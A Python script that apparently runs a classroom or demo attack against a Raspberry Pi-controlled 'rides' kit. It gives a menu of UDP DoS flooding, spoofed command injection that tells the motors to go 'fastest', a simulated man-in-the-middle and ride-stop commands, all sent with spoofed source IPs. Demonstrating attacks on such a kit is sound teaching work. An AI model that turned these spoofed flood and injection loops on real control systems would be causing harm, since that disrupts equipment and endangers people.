#!/usr/bin/env python
import os
import sys
import time
import random
import string
import socket
import argparse
import threading
import fcntl
import struct

import udp_client
import tcp_client

from scapy.all import *
from random import getrandbits
from ipaddress import IPv4Address 

# Define port numbers
# Kit side 1 (Motor A)
DOS_PORT_A = 4444
MITM_PORT_A = 5555
INJECTION_PORT_A = 6666

# Kit side 2 (Motor B)
DOS_PORT_B = 7777
MITM_PORT_B = 8888
INJECTION_PORT_B = 9999

# Default the main port numbers to 0
DOS_PORT = 0
MITM_PORT = 0
INJECTION_PORT = 0


# Function to get the source IP address of the wlan0 interface
def get_ip_address(interface):
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	try:
		ip_address = socket.inet_ntoa(fcntl.ioctl(sock.fileno(), 0x8915,struct.pack('256s', interface[:15].encode('utf-8')))[20:24])
		return ip_address
	except IOError:
		return None


# returns a random string of length 'length'. Used in the DOS payload
def random_payload(length):
	letters = string.ascii_lowercase
	return ''.join(random.choice(letters) for i in range(length))


# Return the attacker_ip based on the attack type and which kit is being used
def attacker_ip(attack, kit):
	src_ip = ""

	if kit == "A":
		if attack == "DoS":
			src_ip = "27.19.88.195"
		if attack == "Injection":
			src_ip = "136.163.89.10"
		if attack == "MitM":
			src_ip = "192.168.99.201"
	elif kit == "B":
		if attack == "DoS":
			src_ip = "27.19.88.196"
		if attack == "Injection":
			src_ip = "136.163.89.11"
		if attack == "MitM":
			src_ip = "192.168.99.202"
		
	return src_ip


def udp_attack(dst_ip, attack, dport, sleep_time, kit):
	src_ip = attacker_ip(attack, kit)
	print(f"Attacker IP = {src_ip}")

	payload = ""

	while udp_attack.running:
		if attack == "DoS":
			payload = random_payload(random.randint(5,15))
		if attack == "Injection":
			payload = "fastest"

		udp_client.spoof_udp_packet(src_ip,dst_ip,payload,dport)
		time.sleep(sleep_time)


# MitM attack
# 
# This uses some smoke and mirrors to achieve something that looks
# like a MitM attack. The idea is that we send packets from us to
# the MitM attacker, and then using smoke and mirrors, send packets
# from the MitM attacker to the destination.
#
def mitm_attack(dst_ip, attack, dport, sleep_time, kit):
	udp_client.send_udp_packet.running = False
	mitm_ip = attacker_ip(attack, kit)
	print(f"MitM Attacker IP - {mitm_ip}")
	
	# Find out source address so that we can spoof a packet from us
	# to the fictional MitM attacker
	ip_address = get_ip_address('wlan0')

	# Send packets from us to the MitM attacker, and then using smoke
	# and mirrors, send packets from the MitM attacker to the destination
	while udp_attack.running:
		udp_client.spoof_udp_packet(ip_address, mitm_ip,"green",dport)
		udp_client.spoof_udp_packet(mitm_ip,dst_ip,"red",dport)
		time.sleep(sleep_time)


def keyboard_listener(dst_ip,dport,attack,sleep_time):
	global MITM_PORT

	print(f"Attacking {dst_ip}")
	input("Press Enter to start sending IDLE packets...")

	# Create a thread for sending packets
	udp_client.send_udp_packet.running = True
	if dport == MITM_PORT:
		thread = threading.Thread(target=udp_client.send_udp_packets, args=(dst_ip,dport,"green",))
		thread.start()
	else:
		thread = threading.Thread(target=udp_client.send_udp_packets, args=(dst_ip,dport,"slow",))
		thread.start()

	input("Press Enter to start the attack...")
	udp_attack.running = True

	if dport == MITM_PORT:
		thread = threading.Thread(target=mitm_attack, args=(dst_ip,attack,dport,sleep_time,kit))
		thread.start()
	else:
		thread = threading.Thread(target=udp_attack, args=(dst_ip,attack,dport,sleep_time,kit))
		thread.start()

	# Wait for keypress to stop sending packets
	if dport == MITM_PORT:
		input("Press Enter to stop the attack and enable encrypted IDLE packets only...")
		udp_attack.running = False
		udp_client.send_udp_packet.running = True
		thread = threading.Thread(target=udp_client.send_udp_packets, args=(dst_ip,dport,"encrypted",))
		thread.start()
	else:
		input("Press Enter to stop the attack and resend IDLE packets only...")
		udp_attack.running = False

	# Wait for spacebar press to stop sending packets
	input("Press Enter to stop sending IDLE packets...")
	udp_client.send_udp_packet.running = False
	
	input("Press Enter to stop the rides...")
	udp_client.send_udp_packet.running = True
		
	thread = threading.Thread(target=udp_client.send_udp_packets, args=(dst_ip,dport,"stopping",))
	thread.start()
	udp_client.send_udp_packet.running = False

	# Wait for the packet sending thread to finish
	thread.join()

	# Clear the input prompt
	clear_prompt()


def clear_prompt():
    if os.name == 'nt':
        _ = os.system('cls')
    else:
        _ = os.system('clear')


if __name__=='__main__':
	# Initialize running state
	udp_client.send_udp_packet.running = False
	tcp_client.send_tcp_packet.running = False
	udp_attack.running = False

	parser = argparse.ArgumentParser(description="CHANGEME")
	
	parser.add_argument("-host", help="The Pi server host to attack\n", required = True)
	
	args = parser.parse_args()
	
	dst_ip = args.host

	# Default the kit variable
	kit = None

	# Input from the user which kit we are using
	while kit not in ['A', 'B']:
		kit = input("Which kit are you? A or B: ")
    
		if kit not in ['A', 'B']:
			print("Invalid input. Please enter either 'A' or 'B'.")

	if kit == 'A':
		print(f"Selected kit: {kit} - Using Motor 1")
		DOS_PORT = DOS_PORT_A
		INJECTION_PORT = INJECTION_PORT_A
		MITM_PORT = MITM_PORT_A

	elif kit == 'B':
		print(f"Selected kit: {kit} - Using Motor 2")
		DOS_PORT = DOS_PORT_B
		INJECTION_PORT = INJECTION_PORT_B
		MITM_PORT = MITM_PORT_B
	
	# Main attack loop
	while True:
		try:
			value = int(input("Please select an attack:\n1==DoS\n2==Injection\n3==MitM\n4==Stop Rides\n5==Flush\n"))
		except ValueError:
			print("Sorry, I didn't understand that.")
			continue

		if value == 1:
        	# Start the keyboard listener
			keyboard_listener(dst_ip,DOS_PORT,"DoS",1)
        	
		if value == 2:
        	# Start the keyboard listener
			keyboard_listener(dst_ip,INJECTION_PORT,"Injection", 5)
		
		if value == 3:
        	# Start the keyboard listener
			keyboard_listener(dst_ip,MITM_PORT,"MitM",5)

		if value == 4:
        	# Start the keyboard listener
			udp_client.send_udp_packet.running = True
			thread = threading.Thread(target=udp_client.send_udp_packets, args=(dst_ip, INJECTION_PORT, "stopping",))
			thread.start()
		
			udp_client.send_udp_packet.running = False
			thread.join()

		if value == 5:
            # Start the keyboard listener
			udp_client.send_udp_packet.running = True
			thread = threading.Thread(target=udp_client.send_udp_packets, args=(dst_ip, INJECTION_PORT, "flush",))
			thread.start()
			udp_client.send_udp_packet.running = False
			thread.join()

